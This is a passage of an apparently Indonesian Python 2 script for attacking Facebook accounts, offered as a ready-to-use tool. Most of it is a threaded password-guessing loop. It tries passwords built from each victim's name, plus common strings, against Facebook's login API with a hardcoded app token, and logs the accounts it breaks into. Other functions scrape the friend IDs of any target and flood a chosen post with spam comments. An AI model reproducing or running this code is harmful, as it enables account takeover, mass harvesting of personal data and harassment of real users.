			pass1 = c['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[0;92m[OK] ' + user + ' • ' + pass1 + ' • ' + c['birthday']
				oks.append(user)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[0;93m[CP] ' + user + ' • ' + pass1 + ' • ' + c['birthday']
					cekpoint.append(user)
				else:
					pass2 = c['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[0;92m[OK] ' + user + ' • ' + pass2 + ' • ' + c['birthday']
						oks.append(user)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[0;93m[CP] ' + user + ' • ' + pass2 + ' • ' + c['birthday']
							cekpoint.append(user)
						else:
							pass3 = c['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[0;92m[OK] ' + user + ' • ' + pass3 + ' • ' + c['birthday']
								oks.append(user)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[0;93m[CP] ' + user + ' • ' + pass3 + ' • ' + c['birthday']
									cekpoint.append(user)
								else:
									pass4 = '786786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[0;92m[OK] ' + user + ' • ' + pass4 + ' • ' + c['birthday']
										oks.append(user)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[0;93m[CP] ' + user + ' • ' + pass4 + ' • ' + c['birthday']
											cekpoint.append(user)
										else:
											pass5 = 'bangladesh'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[0;92m[OK] ' + user + ' • ' + pass5 + ' • ' + c['birthday']
												oks.append(user)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[0;93m[CP] ' + user + ' • ' + pass5 + ' • ' + c['birthday']
													cekpoint.append(user)
												else:
													pass6 = '1012030'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														print '\033[0;92m[OK] ' + user + ' • ' + pass6 + ' • ' + c['birthday']
														oks.append(user)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\033[0;93m[CP] ' + user + ' • ' + pass6 + ' • ' + c['birthday']
															cekpoint.append(user)
														else:
															pass7 = c['first_name'].lower()+'@@@'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																print '\033[0;92m[OK] ' + user + ' • ' + pass7 + ' • ' + c['birthday']
																oks.append(user)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[0;93m[CP] ' + user + ' • ' + pass7 + ' • ' + c['birthday']
																	cekpoint.append(user)
																else:
																	pass8 = c['last_name'].lower()+'123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		print '\033[0;92m[OK] ' + user + ' • ' + pass8 + ' • ' + c['birthday']
																		oks.append(user)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[0;93m[CP] ' + user + ' • ' + pass8 + ' • ' + c['birthday']
																			cekpoint.append(user)
																			
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print 45* "\033[0;97m="
	print '\033[0;97m[\033[0;91m•\033[0;93m•\033[0;92m•\033[0;97m] \033[0;97mSelesai ....'
	print"\033[0;97m[\033[0;91m•\033[0;93m•\033[0;92m•\033[0;97m] \033[0;97mTotal \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;93m"+str(len(cekpoint))
	print '\033[0;97m[\033[0;91m•\033[0;93m•\033[0;92m•\033[0;97m] \033[0;97mCP file tersimpan : out/ind1.txt'
	print 45* "\033[0;97m="
	raw_input("\033[0;97m[\033[0;97m Kembali \033[0;97m]")
	os.system("python2 hitfb.py")
	
######### DUMP ##########
def dump():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		menu()
	os.system('clear')
	print logo
	print "\033[0;97m ══════════════════════════════════════════"
	print "\033[0;97m [\033[0;97m01\033[0;97m]\033[0;93m\033[0;97m Ambil ID dari Daftar Teman "
	print "\033[0;97m [\033[0;97m02\033[0;97m]\033[0;93m\033[0;97m Ambil ID dari Publik / Teman "
	print "\033[0;97m [\033[0;91m00\033[0;97m]\033[0;93m\033[0;97m Kembali "
	print "\033[0;97m ══════════════════════════════════════════"
	dump_pilih()
	
	
def dump_pilih():
	cuih = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m]\033[0;97m ")
	if cuih =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m]\033[0;97m Isi Yg Benar !"
		dump_pilih()
	elif cuih =="1" or cuih =="01":
		id_teman()
	elif cuih =="2" or cuih =="02":
		idfrom_teman()
	elif cuih =="0" or cuih =="00":
		menu()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m] Isi Yg Benar !"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print 45* "\033[0;97m="
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[0;97m[\033[0;93m•\033[0;97m] \033[0;97mMengambil Semua ID Teman \033[0;97m...')
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[0;97m[\033[0;93m"+str(len(idteman))+"\033[0;97m]\033[0;97m =>"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[0;97m'+a['id']
		bz.close()
		print '\r\033[0;97m[\033[0;93m✓\033[0;97m] \033[0;97mSukses Mengambil ID \033[0;97m....'
		print"\r\033[0;97m[\033[0;93m•\033[0;97m] \033[0;97mTotal ID : %s"%(len(idteman))
		done = raw_input("\r\033[0;97m[\033[0;93m?\033[0;97m] \033[0;97mSimpan Nama File : ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[0;97m[\033[0;95m+\033[0;97m] \033[0;97mFile tersimpan : \033[0;97mout/"+done)
		print "\033[0;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		raw_input("\033[0;93m[ \033[0;97mKembali \033[0;93m]")
		os.system("python2 hitfb.py")
	except IOError:
		print"\033[0;91m[!] Gagal membuat file"
		raw_input("\n\033[0;93m[ \033[0;97mKembali \033[0;93m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[0;97m[!] Terhenti !")
		raw_input("\n\033[0;93m[ \033[0;97mKembali \033[0;93m]")
		dump()
	except KeyError:
		print('\033[0;91m[!] Gagal !')
		raw_input("\n\033[0;93m[ \033[0;97mKembali \033[0;93m]")
		dump()
	except OSError:
		print('\033[0;97m[\033[0;95m!\033[0;97m]\033[0;97m File anda tidak tersimpan !')
		raw_input("\n\033[0;93m[ \033[0;97mKembali \033[0;93m]")
		os.system("python2 hitfb.py")
	except requests.exceptions.ConnectionError:
		print"\033[0;97m[×] Tidak ada koneksi !"
		keluar()

##### ID PUBLIK #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print "\033[0;97m ══════════════════════════════════════════"
		idt = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] \033[0;97mNama Akun      : "+op["name"]
		except KeyError:
			print"\033[0;97m[\033[0;91m•\033[0;93m•\033[0;92m•\033[0;97m] ID Publik Tidak Ada !"
			raw_input("\n\033[0;97m[\033[0;97m Kembali \033[0;97m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m] \033[0;97mMengambil Semua ID ...')
		print "\033[0;97m ══════════════════════════════════════════"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[0;97m [ \033[0;97m"+str(len(idfromteman))+"\033[0;97m ]\033[0;91m •\033[0;97m•\033[0;97m"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[0;97m ' + a['id']
		bz.close()
		print '\r\033[0;97m[\033[0;93m✓\033[0;97m] \033[0;97mSukses Mengambil ID \033[0;97m....'
		print"\r\033[0;97m[\033[0;93m•\033[0;97m] Total ID : %s"%(len(idfromteman))
		done = raw_input("\r\033[0;97m[\033[0;93m+\033[0;97m] \033[0;97mSimpan Nama File : ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[0;91m[\033[0;95m√\033[0;97m] File tersimpan : out/"+done)
		raw_input("\n\033[0;93m[ \033[0;97mKembali \033[0;93m]")
		dump()
	except OSError:
		print"\033[0;97m[!] File Tidak Tersimpan "
		raw_input("\n\033[0;93m[ \033[0;97mKembali \033[0;93m]")
		os.system("python2 hitfb.py")
	except IOError:
		print"\033[0;97m[!] Error creating file"
		raw_input("\n\033[0;91m[ \033[0;97mBack \033[0;91m]")
		os.system("python2 hitfb.py")
	except (KeyboardInterrupt,EOFError):
		print("\033[0;97m[!] Terhenti")
		raw_input("\n\033[0;91m[ \033[0;97mBack \033[0;91m]")
		dump()
	except KeyError:
		print('\033[0;97m[\033[0;95m!\033[0;97m] Teman tidak ada !')
		raw_input("\n\033[0;93m[\033[0;97m Kembali \033[0;93m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[0;97m[\033[0;91m✖\033[0;97m] Tidak ada koneksi !"
		keluar()
		
#######AMBIL_ID########
def ambil_id():
 os.system('clear')
 print logo
 u = raw_input('Masukkan username > ')
 url = 'https://www.facebook.com/'+u
 r = requests.get(url).text
 name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
 id = re.search('profile/(.*?)" ', r).group(1)

 print '\nNAMA > '+name
 print 'ID   > '+id+'\n'
		
def botkomen():
	os.system('clear')
	print logo
	print "\033[0;93m ══════════════════════════════════════════"
	print "\033[0;97m [\033[0;97m01\033[0;97m]\033[0;93m\033[0;97m Spam Komen Post Target "
	print "\033[0;97m [\033[0;91m00\033[0;97m]\033[0;93m\033[0;97m Kembali "
	print "\033[0;93m ══════════════════════════════════════════"
	pilih_bot()

def pilih_bot():
	zeed = raw_input("\033[0;97m [\033[0;91m•\033[0;97m•\033[0;97m]\033[0;97m ")
	if zeed =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m] Isi Yg Benar Bro !"
		pilih_bot()
	elif zeed =="1" or zeed =="01":
		spamkomen()
	elif zeed =="0" or zeed =="00":
		keluar()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m] Isi Yg Benar Bro !"
		botkomen()

####SPAM####
def spamkomen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        os.system('python2 hitfb.py')
    os.system("clear")
    print logo
    post = raw_input("\033[32;1mID Postingan \033[34;1m=> \033[37;1m")
    kom = raw_input("\033[32;1mKata Kata \033[34;1m=> \033[37;1m")
    jml = int(input("\033[32;1mLimit \033[34;1m=> \033[37;1m"))
    print '\033[37;1m[\033[31;1m*\033[37;1m] \033[32;1mSpam Berjalan...'
    for x in range(jml):
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    print '\033[33;1m[\033[31;1m*\033[33;1m] \033[34;1mSuccess'
    balik = raw_input('\033[31;1m[Kembali]\n')
    menu()
    

if __name__=='__main__':
        menu()
        masuk()
